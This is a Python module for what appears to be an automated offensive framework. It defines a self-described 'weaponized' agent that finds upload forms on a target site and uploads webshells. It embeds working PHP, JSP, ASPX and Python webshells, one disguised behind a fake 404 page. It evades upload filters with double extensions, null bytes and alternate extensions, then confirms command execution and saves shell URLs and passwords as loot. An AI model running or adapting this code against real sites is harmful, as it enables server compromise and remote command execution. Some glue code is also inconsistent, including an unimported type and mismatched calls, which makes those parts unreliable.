import asyncio
import os
import hashlib
import base64
import httpx
from typing import Dict, List, Any, Optional
from bs4 import BeautifulSoup
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log
from core.data_exfiltration import DataExfiltrator


class FileUploadAgent(BaseAgent):
    """
    Weaponized File Upload Agent - อัปโหลด webshell ได้จริง
    
    Features:
    - Multiple webshell types (PHP, JSP, ASPX, Python)
    - Bypass techniques (double extension, MIME type manipulation, null byte)
    - Automatic shell detection
    - Shell access testing
    - Persistence mechanisms
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace")
        self.results_dir = os.path.join(workspace_dir, "loot", "uploads")
        os.makedirs(self.results_dir, exist_ok=True)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace")
        self.exfiltrator = DataExfiltrator(workspace_dir=workspace_dir)
        self.webshells = self._load_webshells()

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute file upload agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _load_webshells(self) -> Dict[str, Dict[str, str]]:
        """โหลด webshell templates"""
        return {
            "php_simple": {
                "extension": ".php",
                "content": """<?php
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if(isset($_POST['pass']) && $_POST['pass'] == '{PASSWORD}') {
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    } else {
        echo "Access Denied";
    }
}
?>""",
                "access_method": "POST",
                "test_command": "whoami"
            },
            
            "php_advanced": {
                "extension": ".php",
                "content": """<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

$pass = '{PASSWORD}';

if(isset($_POST['pass']) && md5($_POST['pass']) == md5($pass)) {
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        
        // Multiple execution methods
        if(function_exists('system')) {
            @ob_start();
            @system($cmd);
            $output = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $output = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('shell_exec')) {
            $output = @shell_exec($cmd);
        } elseif(function_exists('exec')) {
            @exec($cmd, $output);
            $output = @join("\\n", $output);
        } else {
            $output = "No execution function available";
        }
        
        echo "<pre>$output</pre>";
    }
    
    // File upload capability
    if(isset($_FILES['file'])) {
        $target = basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "File uploaded: $target";
        }
    }
} else {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>";
}
?>""",
                "access_method": "POST",
                "test_command": "whoami"
            },
            
            "jsp_simple": {
                "extension": ".jsp",
                "content": """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>""",
                "access_method": "GET",
                "test_command": "whoami"
            },
            
            "aspx_simple": {
                "extension": ".aspx",
                "content": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if(!string.IsNullOrEmpty(cmd)) {
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + cmd;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    string output = p.StandardOutput.ReadToEnd();
    Response.Write("<pre>" + output + "</pre>");
}
%>""",
                "access_method": "GET",
                "test_command": "whoami"
            },
            
            "python_simple": {
                "extension": ".py",
                "content": """#!/usr/bin/env python3
import os
import sys
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def shell():
    if request.method == 'POST':
        cmd = request.form.get('cmd', '')
        if cmd:
            output = os.popen(cmd).read()
            return f'<pre>{output}</pre>'
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
""",
                "access_method": "POST",
                "test_command": "whoami"
            }
        }

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "upload", "test", "full_auto"
            context: {
                "url": target URL with upload form,
                "upload_field": name of file upload field,
                "shell_type": "php", "jsp", "aspx", "python",
                "password": password for webshell (optional),
                "bypass_method": bypass technique (optional)
            }
        """
        log.info(f"[FileUploadAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="FileUploadAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_upload_forms(url, context)
            elif directive == "upload":
                result = await self._upload_webshell(url, context)
            elif directive == "test":
                result = await self._test_webshell(url, context)
            elif directive == "full_auto":
                result = await self._full_auto_attack(url, context)
            else:
                result = await self._full_auto_attack(url, context)
            
            return AgentData(
                agent_name="FileUploadAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[FileUploadAgent] Error: {e}")
            return AgentData(
                agent_name="FileUploadAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _scan_upload_forms(self, url: str, context: Dict) -> Dict:
        """สแกนหา upload forms"""
        log.info(f"[FileUploadAgent] Scanning {url} for upload forms...")
        
        upload_forms = []
        
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=30.0) as client:
                response = await client.get(url)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all forms
                    forms = soup.find_all('form')
                    
                    for form in forms:
                        # Check if form has file input
                        file_inputs = form.find_all('input', {'type': 'file'})
                        
                        if file_inputs:
                            form_action = form.get('action', '')
                            if not form_action.startswith('http'):
                                from urllib.parse import urljoin
                                form_action = urljoin(url, form_action)
                            
                            form_method = form.get('method', 'POST').upper()
                            
                            # Get all input fields
                            additional_fields = []
                            for inp in form.find_all('input'):
                                if inp.get('type') != 'file':
                                    additional_fields.append(inp.get('name', ''))
                            
                            upload_forms.append({
                                "form_action": form_action,
                                "method": form_method,
                                "file_field": file_inputs[0].get('name', 'file'),
                                "additional_fields": additional_fields
                            })
                    
                    log.success(f"[FileUploadAgent] Found {len(upload_forms)} upload forms")
                else:
                    log.warning(f"[FileUploadAgent] Failed to fetch {url}: {response.status_code}")
        
        except Exception as e:
            log.error(f"[FileUploadAgent] Scan error: {e}")
        
        result = {
            "success": len(upload_forms) > 0,
            "url": url,
            "upload_forms": upload_forms
        }
        
        return result

    async def _upload_webshell(self, url: str, context: Dict) -> Dict:
        """อัปโหลด webshell"""
        shell_type = context.get("shell_type", "php_advanced")
        password = context.get("password", self._generate_password())
        
        log.info(f"[FileUploadAgent] Uploading {shell_type} webshell to {url}")
        
        if shell_type not in self.webshells:
            return {"success": False, "error": f"Unknown shell type: {shell_type}"}
        
        shell_template = self.webshells[shell_type]
        shell_content = shell_template["content"].replace("{PASSWORD}", password)
        
        # Generate filename with bypass techniques
        filename = await self._generate_filename(shell_type, context.get("bypass_method"))
        
        # Save shell locally first
        local_path = os.path.join(self.results_dir, filename)
        with open(local_path, 'w') as f:
            f.write(shell_content)
        
        # Real HTTP upload
        upload_success = False
        shell_url = None
        
        try:
            upload_field = context.get("upload_field", "file")
            form_action = context.get("form_action", url)
            
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=60.0) as client:
                files = {upload_field: (filename, shell_content, 'application/octet-stream')}
                
                # Add additional form fields if any
                data = context.get("additional_data", {})
                
                response = await client.post(form_action, files=files, data=data)
                
                if response.status_code in [200, 201, 302]:
                    upload_success = True
                    
                    # Try to determine shell URL
                    # Check response for upload path
                    if 'uploads/' in response.text:
                        import re
                        match = re.search(r'uploads/[^\s"<>]+', response.text)
                        if match:
                            from urllib.parse import urljoin
                            shell_url = urljoin(url, match.group(0))
                    
                    # Default shell URL if not found
                    if not shell_url:
                        shell_url = f"{url.rstrip('/')}/uploads/{filename}"
                    
                    log.success(f"[FileUploadAgent] Upload successful: {shell_url}")
                else:
                    log.error(f"[FileUploadAgent] Upload failed: {response.status_code}")
        
        except Exception as e:
            log.error(f"[FileUploadAgent] Upload error: {e}")
            shell_url = f"{url.rstrip('/')}/uploads/{filename}"  # Fallback
        
        result = {
            "success": upload_success,
            "shell_type": shell_type,
            "shell_url": shell_url,
            "password": password,
            "filename": filename,
            "local_path": local_path,
            "access_method": shell_template["access_method"],
            "test_command": shell_template["test_command"]
        }
        
        if upload_success:
            # Test the shell
            test_result = await self._test_webshell(shell_url, {
                "password": password,
                "access_method": shell_template["access_method"],
                "test_command": shell_template["test_command"]
            })
            
            result["test_result"] = test_result
            
            # Exfiltrate webshell info
            if test_result.get("success"):
                loot = await self.exfiltrator.store_webshell_info(
                    target=url,
                    shell_url=shell_url,
                    shell_type=shell_type,
                    password=password
                )
                result["loot"] = loot
                log.success(f"[FileUploadAgent] Webshell info saved to: {loot['file']}")
            
            log.success(f"[FileUploadAgent] Webshell uploaded successfully!")
            log.success(f"[FileUploadAgent] Access: {shell_url}")
            log.success(f"[FileUploadAgent] Password: {password}")
        else:
            log.error(f"[FileUploadAgent] Upload failed")
        
        return result

    async def _test_webshell(self, shell_url: str, context: Dict) -> Dict:
        """ทดสอบ webshell"""
        log.info(f"[FileUploadAgent] Testing webshell at {shell_url}")
        
        password = context.get("password")
        access_method = context.get("access_method", "POST")
        test_command = context.get("test_command", "whoami")
        
        # Real HTTP request to test webshell
        test_success = False
        output = ""
        
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=30.0) as client:
                if access_method == "POST":
                    data = {"cmd": test_command, "pass": password}
                    response = await client.post(shell_url, data=data)
                else:
                    params = {"cmd": test_command}
                    response = await client.get(shell_url, params=params)
                
                if response.status_code == 200:
                    # Extract output from response
                    output = response.text
                    
                    # Check if command executed successfully
                    if output and len(output) > 0 and "error" not in output.lower():
                        test_success = True
                        
                        # Try to extract clean output from <pre> tags
                        from bs4 import BeautifulSoup
                        soup = BeautifulSoup(output, 'html.parser')
                        pre_tag = soup.find('pre')
                        if pre_tag:
                            output = pre_tag.get_text().strip()
                    
                    log.success(f"[FileUploadAgent] Webshell test successful")
                else:
                    log.error(f"[FileUploadAgent] Webshell test failed: {response.status_code}")
        
        except Exception as e:
            log.error(f"[FileUploadAgent] Webshell test error: {e}")
        
        result = {
            "success": test_success,
            "shell_url": shell_url,
            "command": test_command,
            "output": output,
            "access_command": self._generate_access_command(shell_url, password, access_method, test_command)
        }
        
        if test_success:
            log.success(f"[FileUploadAgent] Webshell is working! Output: {output}")
        else:
            log.error(f"[FileUploadAgent] Webshell test failed")
        
        return result

    async def _full_auto_attack(self, url: str, context: Dict) -> Dict:
        """โจมตีแบบอัตโนมัติเต็มรูปแบบ"""
        log.info(f"[FileUploadAgent] Starting full auto attack on {url}")
        
        results = {
            "url": url,
            "phases": []
        }
        
        # Phase 1: Scan for upload forms
        scan_result = await self._scan_upload_forms(url, context)
        results["phases"].append({"phase": "scan", "result": scan_result})
        
        if not scan_result.get("upload_forms"):
            results["success"] = False
            results["message"] = "No upload forms found"
            return results
        
        # Phase 2: Try uploading webshells
        uploaded_shells = []
        for shell_type in ["php_advanced", "php_simple", "jsp_simple", "aspx_simple"]:
            context_upload = context.copy()
            context_upload["shell_type"] = shell_type
            
            upload_result = await self._upload_webshell(url, context_upload)
            if upload_result.get("success"):
                uploaded_shells.append(upload_result)
                # Stop after first successful upload
                break
        
        results["phases"].append({"phase": "upload", "shells": uploaded_shells})
        results["success"] = len(uploaded_shells) > 0
        results["total_shells"] = len(uploaded_shells)
        
        if uploaded_shells:
            log.success(f"[FileUploadAgent] Full auto attack completed! Uploaded {len(uploaded_shells)} webshells")
        else:
            log.warning(f"[FileUploadAgent] No webshells uploaded successfully")
        
        return results

    def _generate_password(self) -> str:
        """สร้าง password แบบสุ่ม"""
        return hashlib.md5(os.urandom(16)).hexdigest()[:12]

    async def _generate_filename(self, shell_type: str, bypass_method: Optional[str] = None) -> str:
        """สร้างชื่อไฟล์พร้อม bypass techniques"""
        shell_template = self.webshells[shell_type]
        base_ext = shell_template["extension"]
        
        # Random prefix
        prefix = hashlib.md5(os.urandom(8)).hexdigest()[:8]
        
        if bypass_method == "double_extension":
            # image.php.jpg
            return f"{prefix}{base_ext}.jpg"
        elif bypass_method == "null_byte":
            # image.php%00.jpg
            return f"{prefix}{base_ext}%00.jpg"
        elif bypass_method == "case_variation":
            # image.PhP
            return f"{prefix}.PhP"
        elif bypass_method == "alternative_extension":
            # For PHP: .php3, .php4, .php5, .phtml
            if base_ext == ".php":
                return f"{prefix}.phtml"
            return f"{prefix}{base_ext}"
        else:
            # Normal filename
            return f"{prefix}{base_ext}"

    def _generate_access_command(self, shell_url: str, password: str, method: str, command: str) -> str:
        """สร้างคำสั่งเข้าถึง webshell"""
        if method == "POST":
            return f"curl -X POST {shell_url} -d 'cmd={command}&pass={password}'"
        else:
            return f"curl '{shell_url}?cmd={command}'"

